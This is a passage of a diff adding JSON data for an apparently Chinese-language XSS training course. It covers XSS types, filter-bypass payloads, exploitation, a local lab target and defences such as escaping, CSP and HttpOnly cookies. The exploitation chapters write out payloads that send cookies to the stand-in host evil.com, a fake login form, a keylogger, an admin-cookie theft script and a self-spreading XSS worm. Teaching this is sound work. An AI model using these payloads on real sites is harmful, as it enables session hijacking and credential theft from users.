password='{password}'\"\n```\n\n**修复后**：\n```python\ncursor.execute(\"SELECT * FROM users WHERE username=? AND password=?\", (username, password))\n```\n\n> 验证：使用 `admin' --` 登录，修复后应失败。\n"
+        }
+      ]
+    },
+    {
+      "id": 5,
+      "title": "XSS 跨站脚本",
+      "description": "理解 XSS 攻击原理，掌握反射型、存储型、DOM 型 XSS 的利用与防御。",
+      "status": "published",
+      "chapters": [
+        {
+          "id": 19,
+          "course_id": 5,
+          "title": "第一章：XSS 原理与类型",
+          "order": 1,
+          "content": "# XSS 原理与类型\n\nXSS（Cross-Site Scripting，跨站脚本）攻击通过在页面注入恶意脚本，在其他用户浏览器执行。\n\n## 攻击原理\n\n1. 攻击者构造恶意脚本（JavaScript）\n2. 脚本注入到目标页面\n3. 其他用户访问该页面\n4. 浏览器执行恶意脚本\n5. 窃取 Cookie、会话、敏感信息\n\n## XSS 类型\n\n### 1. 反射型 XSS\n\n**特点**：脚本在 URL 参数中，服务器反射回页面\n\n**示例**：\n```\nhttp://target.com/search?q=<script>alert(document.cookie)</script>\n```\n\n**后端代码**（危险）：\n```python\n# 直接将用户输入嵌入页面\nreturn f\"<html><body>搜索结果：{query}</body></html>\"\n```\n\n**攻击场景**：\n- 诱导用户点击恶意链接\n- 窃取 Cookie、会话\n- 钓鱼攻击\n\n### 2. 存储型 XSS\n\n**特点**：脚本存入数据库，所有用户加载时执行\n\n**示例**：\n- 评论区：`<script>fetch('http://evil.com/steal?cookie='+document.cookie)</script>`\n- 个人简介：`<img src=x onerror=\"alert(1)\">`\n\n**后端代码**（危险）：\n```python\n# 将用户输入直接存入数据库，未转义\ndb.execute(f\"INSERT INTO comments (content) VALUES ('{content}')\")\n\n# 页面加载时直接输出\nfor comment in comments:\n    print(f\"<div>{comment['content']}</div>\")\n```\n\n**攻击场景**：\n- 影响所有访问该页面的用户\n- 传播蠕虫\n- 大规模窃取信息\n\n### 3. DOM 型 XSS\n\n**特点**：前端 JavaScript 直接操作 DOM，不经过服务器\n\n**示例**：\n```javascript\n// 危险：直接使用 location.hash\ndocument.getElementById(\"output\").innerHTML = location.hash.substring(1);\n\n// 访问：http://target.com/page#<img src=x onerror=alert(1)>\n```\n\n**常见危险 API**：\n- `document.write()`\n- `element.innerHTML`\n- `eval()`\n- `setTimeout(string)`\n\n## 靶机实战\n\n启动 XSS 靶机：\n```bash\npython target4_xss.py 8084\n```\n\n访问 `http://localhost:8084`，在搜索框输入：\n```\n<script>alert(document.cookie)</script>\n```\n\n> 如果弹出 Cookie，说明存在反射型 XSS。\n"
+        },
+        {
+          "id": 20,
+          "course_id": 5,
+          "title": "第二章：XSS 利用技巧",
+          "order": 2,
+          "content": "# XSS 利用技巧\n\n## 绕过过滤\n\n### 1. 标签绕过\n\n```html\n<!-- 基本 -->\n<script>alert(1)</script>\n\n<!-- img 标签 -->\n<img src=x onerror=alert(1)>\n\n<!-- svg 标签 -->\n<svg onload=alert(1)>\n\n<!-- body 标签 -->\n<body onload=alert(1)>\n\n<!-- input 标签 -->\n<input onfocus=alert(1) autofocus>\n\n<!-- details 标签 -->\n<details open ontoggle=alert(1)>\n```\n\n### 2. 事件处理器\n\n```html\n<!-- 鼠标事件 -->\n<div onmouseover=alert(1)>hover me</div>\n<a onmouseover=alert(1)>click me</a>\n\n<!-- 焦点事件 -->\n<input onfocus=alert(1) autofocus>\n<select onfocus=alert(1) autofocus>\n\n<!-- 加载事件 -->\n<img src=x onerror=alert(1)>\n<video src=x onerror=alert(1)>\n<body onload=alert(1)>\n```\n\n### 3. 编码绕过\n\n```html\n<!-- HTML 实体编码 -->\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>\n\n<!-- Unicode 编码 -->\n<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>\n\n<!-- Base64 编码 -->\n<img src=x onerror=\"eval(atob('YWxlcnQoMSk='))\">\n\n<!-- 混合编码 -->\n<img src=x onerror=\"\\u0061lert(1)\">\n```\n\n### 4. 大小写混合\n\n```html\n<ScRiPt>alert(1)</ScRiPt>\n<ImG sRc=x OnErRoR=alert(1)>\n```\n\n### 5. 双写绕过\n\n```html\n<!-- 如果过滤 <script> -->\n<scr<script>ipt>alert(1)</scr</script>ipt>\n```\n\n## 窃取 Cookie\n\n### 1. 直接发送到攻击者服务器\n\n```javascript\n<script>\nfetch('http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie));\n</script>\n```\n\n### 2. 使用 Image 对象\n\n```javascript\n<script>\nnew Image().src = 'http://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);\n</script>\n```\n\n### 3. 创建表单自动提交\n\n```javascript\n<script>\nvar form = document.createElement('form');\nform.action = 'http://evil.com/steal';\nform.method = 'POST';\n\nvar input = document.createElement('input');\ninput.name = 'cookie';\ninput.value = document.cookie;\nform.appendChild(input);\n\nform.submit();\n</script>\n```\n\n## 钓鱼攻击\n\n```javascript\n<script>\n// 伪造登录框\ndocument.body.innerHTML = `\n  <h1>会话已过期，请重新登录</h1>\n  <form action=\"http://evil.com/phish\" method=\"POST\">\n    <input type=\"text\" name=\"username\" placeholder=\"用户名\">\n    <input type=\"password\" name=\"password\" placeholder=\"密码\">\n    <button type=\"submit\">登录</button>\n  </form>\n`;\n</script>\n```\n\n## 键盘记录\n\n```javascript\n<script>\ndocument.addEventListener('keypress', function(e) {\n  fetch('http://evil.com/keylog?key=' + encodeURIComponent(e.key));\n});\n</script>\n```\n\n## 靶机实战\n\n启动靶机：\n```bash\npython target4_xss.py 8084\n```\n\n尝试以下 Payload：\n1. `<script>alert(document.cookie)</script>`\n2. `<img src=x onerror=alert(1)>`\n3. `<svg onload=alert(1)>`\n\n> 目标：触发弹窗，证明 XSS 存在。\n"
+        },
+        {
+          "id": 21,
+          "course_id": 5,
+          "title": "第三章：存储型 XSS",
+          "order": 3,
+          "content": "# 存储型 XSS\n\n存储型 XSS 危害最大，脚本存入数据库，影响所有访问用户。\n\n## 攻击场景\n\n### 1. 评论区\n\n```html\n<!-- 发表评论 -->\n<script>\n  fetch('http://evil.com/steal?cookie=' + document.cookie);\n</script>\n\n<!-- 其他用户加载评论时执行 -->\n```\n\n### 2. 个人简介\n\n```html\n<!-- 修改个人资料 -->\n<img src=x onerror=\"fetch('http://evil.com/steal?cookie='+document.cookie)\">\n\n<!-- 其他用户查看该用户资料时执行 -->\n```\n\n### 3. 论坛帖子\n\n```html\n<!-- 发布帖子 -->\n<svg onload=\"fetch('http://evil.com/steal?cookie='+document.cookie)\"></svg>\n\n<!-- 所有查看该帖的用户受影响 -->\n```\n\n## 实战案例\n\n### 案例 1：窃取管理员 Cookie\n\n**步骤**：\n1. 注册普通账户\n2. 在评论区发布存储型 XSS\n3. 等待管理员访问该页面\n4. 管理员 Cookie 发送到攻击者服务器\n5. 使用管理员 Cookie 登录\n\n**Payload**：\n```javascript\n<script>\n  // 只在管理员账户执行\n  if (document.cookie.includes('admin')) {\n    fetch('http://evil.com/admin?cookie=' + document.cookie);\n  }\n</script>\n```\n\n### 案例 2：XSS 蠕虫\n\n**原理**：XSS 自动传播，感染所有用户\n\n**示例**（假设社交网站）：\n```javascript\n<script>\n  // 1. 窃取当前用户 Cookie\n  fetch('http://evil.com/steal?cookie=' + document.cookie);\n  \n  // 2. 以当前用户身份发布新评论（包含相同 Payload）\n  fetch('/post/comment', {\n    method: 'POST',\n    headers: {'Content-Type': 'application/json'},\n    body: JSON.stringify({\n      content: '<script>fetch(\"http://evil.com/steal?cookie=\"+document.cookie)</' + 'script>'\n    })\n  });\n</script>\n```\n\n**效果**：\n- 用户 A 访问页面 → 被感染\n- 用户 A 自动发布恶意评论\n- 用户 B 访问该评论 → 被感染\n- 指数级传播\n\n## 靶机实战\n\n启动靶机：\n```bash\npython target4_xss.py 8084\n```\n\n如果靶机有评论功能，尝试：\n1. 发布评论：`<script>alert('XSS')</script>`\n2. 刷新页面，查看是否弹窗\n3. 如果弹窗，说明存在存储型 XSS\n\n> 注意：存储型 XSS 需要脚本持久化，刷新后仍执行。\n"
+        },
+        {
+          "id": 22,
+          "course_id": 5,
+          "title": "第四章：XSS 防御方案",
+          "order": 4,
+          "content": "# XSS 防御方案\n\n## 1. 输出转义（核心防御）\n\n根据输出位置选择转义方式。\n\n### HTML 内容转义\n\n```python\n# Python\nimport html\n\nuser_input = \"<script>alert(1)</script>\"\nsafe_output = html.escape(user_input)\n# 结果：&lt;script&gt;alert(1)&lt;/script&gt;\n```\n\n```javascript\n// JavaScript\nfunction escapeHTML(str) {\n  return str\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#39;');\n}\n```\n\n### 属性值转义\n\n```html\n<!-- 危险 -->\n<input value=\"${userInput}\">\n\n<!-- 安全：转义双引号 -->\n<input value=\"${escapeHTML(userInput)}\">\n```\n\n### JavaScript 变量转义\n\n```javascript\n// 危险\nvar username = \"${userInput}\";\n\n// 安全：JSON 编码\nvar username = ${JSON.stringify(userInput)};\n```\n\n### URL 参数转义\n\n```javascript\n// 危险\nlocation.href = \"http://target.com/page?name=\" + userInput;\n\n// 安全：URL 编码\nlocation.href = \"http://target.com/page?name=\" + encodeURIComponent(userInput);\n```\n\n## 2. 使用安全 API\n\n```javascript\n// 危险：innerHTML\nelement.innerHTML = userInput;\n\n// 安全：textContent\nelement.textContent = userInput;\n\n// 安全：innerText\nelement.innerText = userInput;\n```\n\n## 3. Content Security Policy（CSP）\n\n**HTTP 头部**：\n```\nContent-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;\n```\n\n**作用**：\n- 限制脚本来源\n- 禁止内联脚本\n- 禁止 eval()\n\n**示例**：\n```html\n<!-- 允许加载同源资源 -->\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'\">\n\n<!-- 允许加载指定 CDN -->\n<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' https://cdn.example.com\">\n```\n\n## 4. HttpOnly Cookie\n\n```python\n# Python Flask\nresponse.set_cookie('session', value, httponly=True)\n```\n\n```javascript\n// JavaScript 无法读取\n// document.cookie 不包含 HttpOnly Cookie\n```\n\n**作用**：即使存在 XSS，也无法窃取 Cookie。\n\n## 5. 输入验证\n\n```python\n# 白名单验证：只允许字母数字\nif not re.match(r'^[a-zA-Z0-9]+$', username):\n    raise ValueError(\"Invalid username\")\n\n# 黑名单过滤（不推荐，容易绕过）\nblacklist = ['<script>', '</script>']\nfor item in blacklist:\n    user_input = user_input.replace(item, '')\n```\n\n## 6. 框架自动转义\n\n**React**：\n```jsx\n// 自动转义，安全\n<div>{userInput}</div>\n\n// 危险：需要显式禁用转义\n<div dangerouslySetInnerHTML={{__html: userInput}} />\n```\n\n**Vue**：\n```vue\n<!-- 自动转义，安全 -->\n<div>{{ userInput }}</div>\n\n<!-- 危险：不转义 -->\n<div v-html=\"userInput\"></div>\n```\n\n**Django**：\n```django\n<!-- 自动转义，安全 -->\n<div>{{ user_input }}</div>\n\n<!-- 危险：禁用转义 -->\n<div>{{ user_input|safe }}</div>\n```\n\n## 7. 安全开发流程\n\n1. **代码审查**：检查所有用户输入是否转义\n2. **静态分析**：使用 ESLint、SonarQube 扫描\n3. **动态测试**：使用 XSS Scanner 测试\n4. **安全培训**：开发人员了解 XSS 原理\n\n## 靶机实战\n\n修复靶机中的 XSS 漏洞：\n\n**修复前**（target4_xss.py）：\n```python\n# 直接输出用户输入\nreturn f\"<html><body>搜索结果：{query}</body></html>\"\n```\n\n**修复后**：\n```python\nimport html\nsafe_query = html.escape(query)\nreturn f\"<html><body>搜索结果：{safe_query}</body></html>\"\n```\n\n> 验证：输入 `<script>alert(1)</script>`，修复后应显示转义后的文本。\n"
         }
       ]
     }
